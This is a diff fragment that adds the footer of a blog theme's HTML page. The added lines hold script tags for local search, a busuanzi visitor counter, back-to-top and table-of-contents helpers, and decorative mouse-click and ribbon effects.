+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
